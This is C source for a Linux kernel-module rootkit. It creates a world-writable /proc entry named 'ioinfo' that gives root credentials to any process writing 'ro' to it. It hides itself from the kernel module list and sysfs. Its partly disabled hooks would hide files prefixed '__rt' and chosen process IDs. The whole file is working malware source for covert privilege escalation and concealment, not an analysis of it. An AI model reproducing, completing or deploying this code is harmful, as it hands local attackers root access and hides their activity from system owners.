#include <linux/init.h>
#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/string.h>
#include <linux/cred.h>
#include <linux/fs.h>
#include <linux/seq_file.h>
#include<linux/sched.h>
#include <asm/uaccess.h>
#include <linux/slab.h>


#define MIN(a,b) \
   ({ typeof (a) _a = (a); \
      typeof (b) _b = (b); \
     _a < _b ? _a : _b; })
#define MAX_PIDS 50
#define GLOBAL_ROOT_UID KUIDT_INIT(0)
#define GLOBAL_ROOT_GID KGIDT_INIT(0)

MODULE_LICENSE("Dual BSD/GPL");

static struct proc_dir_entry *proc_file;
static struct proc_dir_entry *proc_rtkit;
static int (*proc_readdir_orig)(struct file *, void *, filldir_t);
static int (*fs_readdir_orig)(struct file *, void *, filldir_t);
static filldir_t proc_filldir_orig;
static filldir_t fs_filldir_orig;
static struct file_operations *proc_fops;
static struct file_operations *fs_fops;
static char pids_to_hide[MAX_PIDS][8];
static int current_pid = 0;
static char hide_files = 1;
static char module_hidden = 0;
static char module_status[1024];

static struct list_head *proc_module;
static struct list_head *sys_module; //module_kobj_previous;
void module_hide(void)
{
    if (module_hidden) return;
    proc_module = THIS_MODULE->list.prev;
    list_del_init(&THIS_MODULE->list);
    sys_module = THIS_MODULE->mkobj.kobj.entry.prev;
    kobject_del(&THIS_MODULE->mkobj.kobj);
    //list_del_init(&THIS_MODULE->mkobj.kobj.entry);
    module_hidden = !module_hidden;
}

//todo make rmmod work
void module_show(void)
{
    if (!module_hidden) return;
    list_add(&THIS_MODULE->list, proc_module);
    list_add(&THIS_MODULE->mkobj.kobj.entry, sys_module);
    //kobject_init_and_add(&THIS_MODULE->mkobj.kobj,
    //                     &THIS_MODULE->mkobj.kobj.parent,
    //                     &THIS_MODULE->mkobj.kobj.ktype, "rt");
    module_hidden = !module_hidden;
}

static void set_addr_rw(void *addr)
{
    unsigned int level;
    pte_t *pte = lookup_address((unsigned long) addr, &level);
    if (pte->pte &~ _PAGE_RW) pte->pte |= _PAGE_RW;
}

static void set_addr_ro(void *addr)
{
    unsigned int level;
    pte_t *pte = lookup_address((unsigned long) addr, &level);
    pte->pte = pte->pte &~_PAGE_RW;
}

static int proc_filldir_new(void *buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type)
{
    int i;
    for (i=0; i < current_pid; i++) {
      if (!strcmp(name, pids_to_hide[i])) return 0;
    }
    if (!strcmp(name, "rtkit")) return 0;
    return proc_filldir_orig(buf, name, namelen, offset, ino, d_type);
}

static int proc_readdir_new(struct file *filp, void *dirent, filldir_t filldir)
{
    proc_filldir_orig = filldir;
    return proc_readdir_orig(filp, dirent, proc_filldir_new);
}

static int fs_filldir_new(void *buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type)
{
    if (hide_files && (!strncmp(name, "__rt", 4) || !strncmp(name, "10-__rt", 7))) return 0;
    return fs_filldir_orig(buf, name, namelen, offset, ino, d_type);
}

static int fs_readdir_new(struct file *filp, void *dirent, filldir_t filldir)
{
    fs_filldir_orig = filldir;
    return fs_readdir_orig(filp, dirent, fs_filldir_new);
}

static int rtkit_write(struct file *file, const char __user *buff, unsigned long count, void *data)
{
    if (!strncmp(buff, "mypenislong", MIN(11, count))) { //changes to root
        struct cred *credentials = prepare_creds();
        credentials->uid = credentials->euid = GLOBAL_ROOT_UID;
        //credentials->uid = credentials->euid = 0;
        credentials->gid = credentials->egid = GLOBAL_ROOT_GID;
        //credentials->gid = credentials->egid = 0;
        commit_creds(credentials);
    } else if (!strncmp(buff, "hp", MIN(2, count))) {//upXXXXXX hides process with given id
        if (current_pid < MAX_PIDS) strncpy(pids_to_hide[current_pid++], buff+2, MIN(7, count-2));
    } else if (!strncmp(buff, "up", MIN(2, count))) {//unhides last hidden process
        if (current_pid > 0) current_pid--;
    } else if (!strncmp(buff, "thf", MIN(3, count))) {//toggles hide files in fs
        hide_files = !hide_files;
    } else if (!strncmp(buff, "mh", MIN(2, count))) {//module hide
        module_hide();
    } else if (!strncmp(buff, "ms", MIN(2, count))) {//module hide
        module_show();
    }
    return count;
}

static void procfs_clean(void)
{
    if (proc_rtkit != NULL) {
        remove_proc_entry("ioinfo", NULL);
        proc_rtkit = NULL;
    }
    if (proc_fops != NULL && proc_readdir_orig != NULL) {
        set_addr_rw(proc_fops);
    //    proc_fops->readdir = proc_readdir_orig;
        set_addr_ro(proc_fops);
    }
}

static void fs_clean(void)
{
    if (fs_fops != NULL && fs_readdir_orig != NULL) {
        set_addr_rw(fs_fops);
    //    fs_fops->readdir = fs_readdir_orig;
        set_addr_ro(fs_fops);
    }
}

static int __init fs_init(void)
{
    struct file *etc_filp;

    //get file_operations of /etc
    etc_filp = filp_open("/etc", O_RDONLY, 0);
    if (etc_filp == NULL) return 0;
    fs_fops = (struct file_operations *) etc_filp->f_op;
    filp_close(etc_filp, NULL);

    //substitute readdir of fs on which /etc is
    //fs_readdir_orig = fs_fops->readdir;
    set_addr_rw(fs_fops);
    //fs_fops->readdir = fs_readdir_new;
    set_addr_ro(fs_fops);

    return 1;
}

static int rtkit_read(char *buffer, char **buffer_location, off_t off, int count, int *eof, void *data)
{
    int size;

    sprintf(module_status,
"RTKIT\n\
DESC:\n\
  hides files prefixed with __rt or 10-__rt and gives root\n\
CMNDS:\n\
  mypenislong - uid and gid 0 for writing process\n\
  hpXXXX - hides proc with id XXXX\n\
  up - unhides last process\n\
  thf - toogles file hiding\n\
  mh - module hide\n\
  ms - module show\n\
STATUS\n\
  fshide: %d\n\
  pids_hidden: %d\n\
  module_hidden: %d\n", hide_files, current_pid, module_hidden);

    size = strlen(module_status);

    if (off >= size) return 0;

    if (count >= size-off) {
        memcpy(buffer, module_status+off, size-off);
    } else {
        memcpy(buffer, module_status+off, count);
    }

    return size-off;
}

char *msg;
int msg_size=1000;
int read_proc(struct file *filp,char *buf,size_t count,loff_t *offp )
{
    if ( strcmp(msg,"help\n") == 0 ) {
        memset(msg, 0, msg_size);
        char *response="\
   ss - show status\n\
   ro - root\n\
   fh - file hide\n\
   fs - file show\n\
   ph - process hide\n\
   ps - process show\n\
   mh - module hide\n\
   ms - module show\n";
        copy_to_user(buf, response, strlen(response));
        return strlen(response);
    } else if ( strcmp(msg,"ss\n") == 0 ) {
        memset(msg, 0, msg_size);
        char *response="module:\n";
        copy_to_user(buf, response, strlen(response));
        return strlen(response);
    }
    return 0;
}

int write_proc(struct file *filp,const char *buf,size_t count,loff_t *offp)
{
    if (count < msg_size) {
        copy_from_user(msg,buf,count);
        if ( strcmp(msg,"fh\n") == 0 ) {
            printk("fh\n");
        } else if ( strcmp(msg,"ro\n") == 0 ) {
            printk("ro %d\n", GLOBAL_ROOT_UID);
            struct cred *credentials = prepare_creds();
            credentials->uid = credentials->euid = GLOBAL_ROOT_UID;
            //credentials->uid = credentials->euid = 0;
            credentials->gid = credentials->egid = GLOBAL_ROOT_GID;
            //credentials->gid = credentials->egid = 0;
            commit_creds(credentials);
        } else if ( strcmp(msg,"fs\n") == 0 ) {
            printk("fs\n");
        } else if ( strcmp(msg,"ph\n") == 0 ) {
            printk("ph\n");
        } else if ( strcmp(msg,"ps\n") == 0 ) {
            printk("ps\n");
        } else if ( strcmp(msg,"mh\n") == 0 ) {
            module_hide();
        } else if ( strcmp(msg,"ms\n") == 0 ) {
            module_show();
        }
    }
    return count;
}

struct file_operations ioinfo_fops = {
    read: read_proc,
    write: write_proc
};

static int __init procfs_init(void)
{
    msg=kmalloc(msg_size,GFP_KERNEL);
    memset(msg, 0, msg_size);
    if (msg == NULL) return -1;
    proc_file = proc_create("ioinfo", 0666, NULL, &ioinfo_fops);
    if (proc_file == NULL) {
        kfree(msg);
        return -1;
    }
    return 0;
}

static int _init(void)
{
    if (procfs_init() != 0) {
        printk("[ERROR] procfs_init\n");
        return -1;
    }
    printk("ROOTKIT STARTED\n");
    //if (!procfs_init() || !fs_init()) {
    //    procfs_clean();
    //    fs_clean();
    //    return 1;
    //}
    //module_hide();
    //module_show();
    return 0;
}

static void _exit(void)
{
    remove_proc_entry("ioinfo", NULL);
    kfree(msg);
    printk("ROOTKIT STOPPED\n");
    //procfs_clean();
    //fs_clean();
}

module_init(_init);
module_exit(_exit);
